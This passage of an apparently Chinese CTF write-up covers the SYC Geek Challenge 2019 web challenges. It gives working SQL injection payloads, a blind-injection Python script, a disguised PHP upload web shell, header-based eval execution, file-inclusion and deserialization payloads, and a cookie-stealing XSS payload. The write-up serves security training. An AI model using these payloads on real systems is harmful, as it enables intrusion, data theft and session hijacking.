+<p>发现能回显的地方是name，读取/etc/passwd成功，那么就读一下flag</p>
+<p>但是会发现直接读<code>f14g_Is_Here.php</code>读不出来，这是因为php文件中有特殊字符(如&lt;)让xml解 析时出错了,可以利用php流读取，base64解密就行</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115234743.png"></p>
+<h2 id="李三的代码审计笔记第二页"><a href="#李三的代码审计笔记第二页" class="headerlink" title="李三的代码审计笔记第二页"></a>李三的代码审计笔记第二页</h2><h2 id="Babysql"><a href="#Babysql" class="headerlink" title="Babysql"></a>Babysql</h2><p>这题双写绕过就行，发现对<code>union,select,for,form</code>都替换成空了</p>
+<p><strong>爆数据库</strong></p>
+<pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23</code></pre>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117200927.png"></p>
+<p><strong>爆表</strong></p>
+<pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23</code></pre>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117201208.png"></p>
+<p><strong>爆字段</strong></p>
+<pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=&#39;geek&#39; anandd table_name=&#39;b4bsql&#39;%23</code></pre>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117202116.png"></p>
+<p><strong>爆内容</strong></p>
+<pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(id,0x23,username,0x23,passwoorrd) frfromom geek.b4bsql%23</code></pre>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117202552.png"></p>
+<h2 id="神秘的三叶草"><a href="#神秘的三叶草" class="headerlink" title="神秘的三叶草"></a>神秘的三叶草</h2><p>这道题其实很简单，怪当时没看仔细</p>
+<p>查看源代码，发现<code>Secret.php</code></p>
+<p>改下<code>User-Agent</code>，<code>Referer</code>，<code>X-Forwarded-For</code>就行，注意bp抓包改的时候要有个空格，并且是英文输入法下的空格</p>
+<pre><code>Syc&#123;We1com3_t0_Syc_S3creT&#125;</code></pre>
+<h2 id="Eval-evil-code"><a href="#Eval-evil-code" class="headerlink" title="Eval evil code"></a>Eval evil code</h2><p>这道题感觉很好，考察的是<strong>php无参数执行命令</strong></p>
+<p>就是用无参数的php函数去执行命令，之前没了解过，这次就学学吧</p>
+<p>可以看下我这篇博客</p>
+<p>验证码部分，可以直接脚本跑出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(1, 10000001):</span><br><span class="line">    s &#x3D; hashlib.md5(str(i).encode()).hexdigest()[0:4]</span><br><span class="line">    #s &#x3D; hashlib.sha1(str(i)).hexdigest()[:6]</span><br><span class="line">    if s &#x3D;&#x3D; &quot;978e&quot;:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<p>先传个phpinfo看看，发现</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191112205429.png"></p>
+<p>这里就用Headers的方法</p>
+<pre><code>eval(end(getallheaders()));</code></pre>
+<p>获取headers的最后一个执行（注意在http请求头的函数是可以有参数的）</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115224848.png"></p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115225514.png"></p>
+<p>读取<code>theflag.php</code>内容即可</p>
+<h2 id="Jiang‘s-Secret"><a href="#Jiang‘s-Secret" class="headerlink" title="Jiang‘s Secret"></a>Jiang‘s Secret</h2><p>查看源码，发现有个<code>Archive_room.php</code>，访问点击secret提示查阅结束，抓包看下发现有个人<code>action.php</code>，发送到repeater,go一下发现<code>secr3t.php</code> ,访问发现代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre>
+<p>base64解密发现flag</p>
+<pre><code>Syc&#123;Jiang_1uYuan_No_I&#125;</code></pre>
+<h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><p>这题用的是报错注入，<code>union|or|and|substr|if|hex|mid|char|</code>等等都进行 了过滤，这里只能用报错注入<br><strong>爆数据库</strong></p>
+<pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)%23</code></pre>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117205229.png"></p>
+<p><strong>爆表</strong></p>
+<pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like&#39;geek&#39;),0x7e),1)%23</code></pre>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117210116.png"></p>
+<p><strong>爆字段</strong></p>
+<pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;),0x7e),1)%23</code></pre>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117211051.png"></p>
+<p><strong>爆内容</strong></p>
+<pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1)%23</code></pre>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117211308.png"></p>
+<p>在buu上flag的长度太长，我们可以用reverse函数</p>
+<img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/TIM截图20200516170018.png" style="zoom:80%;">
+
+<h2 id="你有特洛伊么"><a href="#你有特洛伊么" class="headerlink" title="你有特洛伊么"></a>你有特洛伊么</h2><p>给了个base64加密的东西，解密发现是<code>this is not easy</code>，好像没啥用</p>
+<p>打开网址，发现可以上传文件，试着上传，发现对文件头做了检测，并且对<code>&lt;?</code>过滤</p>
+<p>发现.phtml没有过滤，所以就上传一句话</p>
+<pre><code>GIF89a
+&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;shell&#39;]);&lt;/script&gt;</code></pre>
+<p>抓包前为<code>.gif</code>格式，抓包后改成<code>.phtml</code></p>
+<p>蚁剑连，得到flag</p>
+<pre><code>Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125;</code></pre>
+<h2 id="Leixiao’s-blog"><a href="#Leixiao’s-blog" class="headerlink" title="Leixiao’s blog"></a>Leixiao’s blog</h2><p>提示用XSS，但是写在博客里的东西只有自己账号可以看到，所以就去其他找XSS</p>
+<p>发现注册时的密保问题是可控的，抓包修改即可，发现是限制长度的为32位</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115214608.png"></p>
+<p>并没有弹窗</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115215210.png"></p>
+<p>查看源代码</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115215314.png"></p>
+<p>所以闭合标签的payload</p>
+<pre><code>&quot;&gt;&lt;script src=***&gt;</code></pre>
+<p>在***里填入盗cookie的代码</p>
+<p>登陆xss平台</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115215947.png"></p>
+<p>bp抓包改下question</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115220224.png"></p>
+<p>然后把链接发给管理员</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191115220539.png"></p>
+<p>在xss平台可以看到就可以得到flag了</p>
+<h2 id="反序列化1-0"><a href="#反序列化1-0" class="headerlink" title="反序列化1.0"></a>反序列化1.0</h2><p>这题就是考察对反序列化的基本认识</p>
+<p>查看源代码发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Student</span><br><span class="line">&#123;</span><br><span class="line">    public $score &#x3D; 0;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__destruct working&quot;;</span><br><span class="line">        if($this-&gt;score&#x3D;&#x3D;10000) &#123;</span><br><span class="line">            $flag &#x3D; &quot;******************&quot;;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp &#x3D; $_GET[&#39;exp&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>只需将<code>$score=10000</code>就行,</p>
+<p>payload:</p>
+<pre><code>?exp=O:7:&quot;Student&quot;:1:&#123;s:5:&quot;score&quot;;i:10000;&#125;
+
+Syc&#123;F4n-Xu-L4i-Hu4-Ha-Ha-Ha&#125;</code></pre>
+<h2 id="又来一只猫"><a href="#又来一只猫" class="headerlink" title="又来一只猫"></a>又来一只猫</h2><p>dirsearch扫一下发现<code>www.zip</code>文件，发现好像是网站之前的源码</p>
+<p>从<code>index.php</code>可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include &#39;class.php&#39;;</span><br><span class="line">$select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">$res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>从<code>class.php</code>可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这题就变成了绕过<code>__wakeup</code>方法</p>
+<p>payload：</p>
+<pre><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;
+
+Syc&#123;H31lo_4dmiN_r3al_f14g&#125;</code></pre>
+<h2 id="你有初恋吗"><a href="#你有初恋吗" class="headerlink" title="你有初恋吗"></a>你有初恋吗</h2><p>查看源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$adore&#x3D;&#39;***************&#39;;</span><br><span class="line">$now &#x3D; $_POST[&#39;lover&#39;];</span><br><span class="line">setcookie(&quot;Heart&quot;, md5($adore.&#39;syclover&#39;));</span><br><span class="line">if(isset($now)&amp;&amp;$now!&#x3D;syclover) &#123;</span><br><span class="line">	if($_COOKIE[&#39;Heart&#39;] &#x3D;&#x3D;&#x3D; md5($adore. urldecode($now)))&#123;</span><br><span class="line">		die ($flag);</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			die(&#39;I do not love you! You are not in my heart!&#39;);</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>这里用url二次编码就行</p>
+<p>直接用hackbar POST</p>
+<pre><code>lover=%2573%2579%2563%256c%256f%2576%2565%2572
+
+Syc&#123;D0_Y0u_l0v3_M3???&#125;</code></pre>
+<h2 id="ﬁnalsql"><a href="#ﬁnalsql" class="headerlink" title="ﬁnalsql"></a>ﬁnalsql</h2><p>这道题登陆框的注入已经被过滤的干干净净，不过在神秘代码处可以进行异或盲注</p>
+<p>空格，*以及所有mysql里可以代替空格的不可显字符，但是没有禁用括号</p>
+<p>禁用了or或and与=连用，所以or 1=(payload)形式不好用了，这里可以用异或注入（当然其它运算符都可以），脚本如下</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117212655.png"></p>
+<p>二分法脚本：</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/20191117212626.png"></p>
+<p>上面是抄别人的wp 自己做下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search.php?id&#x3D;1</span><br><span class="line">search.php?id&#x3D;2-1</span><br></pre></td></tr></table></figure>
+
+<p>两处回显结果一样 说明可能有注入 fuzz一下关键字  在buu注意要修改线程还有延时</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/image-20210212135321687.png" alt="image-20210212135321687"></p>
+<p>长度为890的都过滤了</p>
+<p><img src="/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/image-20210212135429458.png" alt="image-20210212135429458"></p>
+<p>也不太多 直接异或注入吧 空格过滤使用括号 ord ascii没有过滤 if过滤了 不用也行 可以二分bool盲注 写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxies =&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://984cd692-e1ae-42fc-aceb-4efd0170059a.node3.buuoj.cn/search.php?id=1&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload1=&quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))=&#123;&#125;)&quot;.format(str(i),str(mid))</span></span><br><span class="line">        <span class="comment"># payload2=&quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(str(i),str(mid))</span></span><br><span class="line">        <span class="comment"># payload1=&quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))=&#123;&#125;)&quot;.format(str(i),str(mid))</span></span><br><span class="line">        <span class="comment"># payload2=&quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(str(i),str(mid))</span></span><br><span class="line">        payload1=<span class="string">&quot;^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;&#125;,1))=&#123;&#125;)&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        payload2=<span class="string">&quot;^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r1=requests.get(url+payload1)</span><br><span class="line">            print(i,mid)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ERROR！！！&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.get(url+payload2)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/>http://www.moonback.xyz/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-12T14:46:48+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年2月12日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/wp/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>wp</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/SYC/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>SYC</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/&title=SYC极客大挑战writeup - 明月归的小站&summary=听学长说这里的题还挺简单的，便过来做了做，总结一下吧！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/&title=SYC极客大挑战writeup - 明月归的小站&summary=听学长说这里的题还挺简单的，便过来做了做，总结一下吧！"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2019/11/06/%E6%AF%94%E8%B5%9B/2019/syc-ctf-wp/&title=SYC极客大挑战writeup - 明月归的小站&summary=听学长说这里的题还挺简单的，便过来做了做，总结一下吧！"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2019/11/06/%E7%9F%A5%E8%AF%86%E7%82%B9/json-web-token/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>JWT学习</p>
+                <p class='content'>本篇博客主要记录了JWT机制的学习过程！
+
+
+什么是JWT?JWT全称JSON WEB Token，是用于身份认证的
+为什么要有身份认证？
+主要是因为HTTP是无状态的，同样让HTTP有状态的方...</p>
+              </a>
+            
+            
+              <a class='next' href='/2019/11/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/aircrack-wifi/'>
+                <p class='title'>Aircrack-ng学习使用<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了Aircrack-ng的使用，以及用此工具破解wifi的教程！
+
+
+Aircrack-ng是什么？Aircrack-ng是一个与802.11标准的无线网络分析有关的安全套件。
+...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%AF%94%E8%B5%9B%E4%B9%8B%E5%89%8D%E5%85%88%E6%92%B8%E4%B8%80%E5%8F%AA%E7%8C%AB%EF%BC%81"><span class="toc-text">打比赛之前先撸一只猫！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E7%9C%8B%E8%A7%81%E8%BF%87%E6%88%91%E7%9A%84%E8%8F%9C%E5%88%80%E4%B9%88"><span class="toc-text">你看见过我的菜刀么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BurpSuiiiiiit"><span class="toc-text">BurpSuiiiiiit!!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%A7%E6%84%9F%E6%BD%87%E6%96%87%E6%B8%85%EF%BC%8C%E5%9C%A8%E7%BA%BF%E7%AE%97%E5%8D%A6"><span class="toc-text">性感潇文清，在线算卦</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easysql"><span class="toc-text">Easysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-me"><span class="toc-text">RCE me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%8E%E4%B8%89%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%B8%80%E9%A1%B5"><span class="toc-text">李三的代码审计笔记第一页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F"><span class="toc-text">服务端检测系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lovelysql"><span class="toc-text">Lovelysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%A7%E6%84%9F%E9%BB%84%E9%98%BF%E5%A7%A8%EF%BC%8C%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9"><span class="toc-text">性感黄阿姨，在线聊天</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%8E%E4%B8%89%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%BA%8C%E9%A1%B5"><span class="toc-text">李三的代码审计笔记第二页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Babysql"><span class="toc-text">Babysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E7%9A%84%E4%B8%89%E5%8F%B6%E8%8D%89"><span class="toc-text">神秘的三叶草</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Eval-evil-code"><span class="toc-text">Eval evil code</span></a></li><li class="toc-item toc-level-2"><a 